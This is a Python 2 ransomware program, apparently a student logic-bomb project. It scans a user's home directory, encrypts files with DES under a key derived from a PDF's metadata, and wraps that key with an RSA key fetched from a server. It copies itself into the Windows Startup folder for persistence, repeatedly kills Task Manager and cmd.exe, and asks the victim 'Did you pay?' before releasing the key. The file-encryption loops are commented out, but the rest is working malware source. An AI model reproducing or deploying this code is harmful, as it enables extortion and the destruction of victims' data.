# -*- coding: utf-8 -*-
import os, fnmatch, hashlib, base64, re, hashlib, time, thread, socket, threading, subprocess
from Crypto.Cipher import DES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from pyPdf import PdfFileReader
from time import gmtime, strftime
from Tkinter import *
from shutil import copyfile

"""                                                  
 DESCRIPTION: This function encrypts a bunch of data (text),               
           based on a key declared globaly.                                
 RETURN: It returns the encrypted data (cipher).                           
"""
def encryptDES(text):
    b = 8 - len(text)%8
    padd = ""
    if b: padd =  "." + "X" * (b - 1)
    des = DES.new(key, DES.MODE_ECB)
    cipher = des.encrypt(text + padd)
    encoded_cipher = base64.b64encode(cipher)
    return encoded_cipher

#############################################################################
# NAME: decryptDES()                                                        #
# DESCRIPTION: This function decrypts a bunch of data (encoded_cipher),     #
#           based on a key declared globaly.                                #
# RETURN: It returns the plain data.                                        #
#############################################################################
def decryptDES(encoded_cipher):
    des = DES.new(key, DES.MODE_ECB)
    cipher = base64.b64decode(encoded_cipher)
    text = des.decrypt(cipher)
    charref = re.compile("\.X{0,7}" , re.VERBOSE)
    match_str = re.sub(charref , "" , text[len(text) - 8:])
    text_corrected = text[:len(text) - 8] + match_str
    return text_corrected

#############################################################################
# NAME: find()                                                              #
# DESCRIPTION: This function finds a regex pattern in a list of files       #
#            in a directory.                                                #
# RETURN: It returns the set of files matching the pattern                  #
#############################################################################
def find(pattern, path):
    result = [] 
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))

    return result

#############################################################################
# NAME: generate_write_encryption()                                         #
# DESCRIPTION: This function tries to open a file a file get the content    #
# encrypts it and write the encrypted content again in the file.            #
#############################################################################
def generate_write_encryption():
    global a
    global list_of_files_not_encrypted
    try:
        with open(filename, 'rb+') as fd:
            # simplemente hacer "for line in f", lo que te daria "line"
            # Además, esto te cierra solo el objeto.
            buffer = fd.read()
            fd.seek(0)
            fd.write(encryptDES(buffer))
            a += 1
    except Exception, e:
        print "[-] An error ocurred: ", str(e), " [-]"
        print "\t" + filename
        list_of_files_not_encrypted.append(filename)
    return

#############################################################################
# NAME: restore_files()                                                     #
# DESCRIPTION: This function tries to open a file a file get the content    #
# decrypts it, delete the actual content of the file and writes             #
# the decrypted content again in the file.                                  #
#############################################################################
def restore_files():
    global a
    global list_of_files_not_decrypted
    try:
        with open(filename, 'rb+') as fd:
            buffer = fd.read()
            fd.seek(0)
            fd.truncate()
            fd.write(decryptDES(buffer))
            a += 1
    except Exception, e:
        print "[-] An error ocurred: ", str(e), " [-]"
        print "\t" + filename
        list_of_files_not_decrypted.append(filename)
    return

#############################################################################
# NAME: get_public_key()                                                    #
# DESCRIPTION: This function establish a connection with the server and     #
# receives the public key.                                                  #
# RETURN: It returns a string with the public_key value                     #
#############################################################################
def get_public_key():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host ="localhost"
    port = 8000
    s.connect((host,port))
    data = 'a'
    s.send(data.encode())
    public_key = s.recv(1024).decode()
    print "\t Data received: ", public_key
    s.close ()
    return public_key

#############################################################################
# NAME: get_public_key()                                                    #
# DESCRIPTION: This function establish a connection with the server and     #
# receives the public key.                                                  #
# RETURN: It returns a string with the public_key value                     #
#############################################################################
def get_private_key():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host ="localhost"
    port = 8000
    s.connect((host,port))
    data = 'b'
    s.send(data.encode())
    private_key = s.recv(1024).decode()
    print "\t Data received: ", private_key
    s.close ()
    return private_key

def encryptRSA(text, public_key):
    cipher = PKCS1_OAEP.new(RSA.importKey(public_key))
    return cipher.encrypt(text)

def decryptRSA(ciphertext, private_key):
    cipher = PKCS1_OAEP.new(RSA.importKey(private_key))
    return cipher.decrypt(ciphertext)

#############################################################################
# NAME: md5()                                                               #
# DESCRIPTION: This function, based on a file name received, computes       #
# the actual md5 hash of it .                                               #
#############################################################################
def md5(fname):
    hash = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash.update(chunk)
    return hash.hexdigest()

def end_of_file():
    print "\tkey: ", key
    print "Number of files read = ", len(list_of_files)
    print "Number of files operated = ", a
    raw_input("Press Enter to continue")

def write_summary():
    test_results = file("test_results.txt", "w+")
    test_results.write("[*] NOT ENCRYPTED FILES\n")
    for file_element in list_of_files_not_encrypted:
        test_results.write(file_element + "\n")
    test_results.write("\n")
    test_results.write("[*] NOT DECRYPTED FILES\n")
    for file_element in list_of_files_not_decrypted:
        test_results.write(file_element + "\n")

class TestThread(threading.Thread):
    def __init__(self, name = 'killer_thread'):
        self._stopevent = threading.Event()
        self._sleepperiod = 1.0
        threading.Thread.__init__(self, name=name)

    def run(self):
        with open('out-file.txt', 'w') as fd_result:
            while not self._stopevent.isSet():
                out = subprocess.call("taskkill /f /im taskmgr.exe", stdout=fd_result, stderr=subprocess.STDOUT)
                subprocess.call("taskkill /f /im cmd.exe", stdout=fd_result, stderr=subprocess.STDOUT)
                time.sleep(10)
                self._stopevent.wait(self._sleepperiod)

    def join(self, timeout=None):
        self._stopevent.set( )
        threading.Thread.join(self, timeout)

def print_baner():
    print "_ _ _ ____ _    ____ ____ _  _ ____\n| | | |___ |    |    |  | |\/| |___\n|_|_| |___ |___ |___ |__| |  | |___\n"                                
    print " _  _ ____ ___  ____ ____ ____ _  _ _  _ ____ ____ "
    print " |\/| |  | |  \ |___ |__/ |___ |  | |_/  |___ |__/ "
    print " |  | |__| |__/ |___ |  \ |    |__| | \_ |___ |  \ "

def writing_key_and_infecting():
    try:
        copyfile(first_exe_dir, second_exe_dir)
    except Exception, e:
        print "Error: ", e
    fd = open(startup_key_dir, "w")
    fd.write(encrypted_key)
    fd.close()

list_of_files = find('*.*', 'C:\\Users\\radiactivo\\')
current_directory = os.getcwd()
list_of_files_not_encrypted = []
list_of_files_not_decrypted = []
a = 0

""" directory list """
startup_key_dir     =   "C:\\Users\\radiactivo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\key.txt"
cryptool_dir        =   "C:\\Program Files\\CrypTool\\"
cryptool_exe_dir    =   "C:\\Program Files\\CrypTool\\CrypTool.exe"
pdf_dir             =   "C:\\Users\\radiactivo\\Desktop\\sample.pdf"
first_exe_dir       =   "C:\\Users\\radiactivo\\Google Drive\\TFG\\Bomba Logica\\Logic.py"
second_exe_dir      =   "C:\\Users\\radiactivo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AmHere.py"

if startup_key_dir is not list_of_files:
    checkCondition =    lambda: os.path.exists(cryptool_dir) & os.path.isfile(cryptool_exe_dir) & os.path.isfile(pdf_dir)
    key            =    lambda: hashlib.sha256(PdfFileReader(file(pdf_dir, "rb")).getDocumentInfo()['/CreationDate']).digest()[:8]

    #if checkCondition() == False: exit()
    key = key()
    list_of_files.remove(first_exe_dir)

    print "Starting encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
    #for filename in list_of_files:
        #generate_write_encryption()
    print "Ending encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())

    list_of_files.append(first_exe_dir)
    encrypted_key = encryptRSA(key, get_public_key())
    writing_key_and_infecting()

    end_of_file()

if  first_exe_dir not in list_of_files:
    copyfile(second_exe_dir, first_exe_dir);

killer_thread = TestThread()
killer_thread.start()
print_baner()

if "yes" ==  raw_input("Please answer this simple question:\n\tDid you pay?\n"):
    killer_thread.join()
    fd = open(startup_key_dir, "r")
    decrypted_key = decryptRSA(fd.read(), get_private_key())
    fd.close()
    print "The decryption key is: ", decrypted_key
    key = decrypted_key
    print "[*] key reocevered [*]"  

    #for filename in list_of_files:
        #restore_files()

raw_input("Press Enter to continue")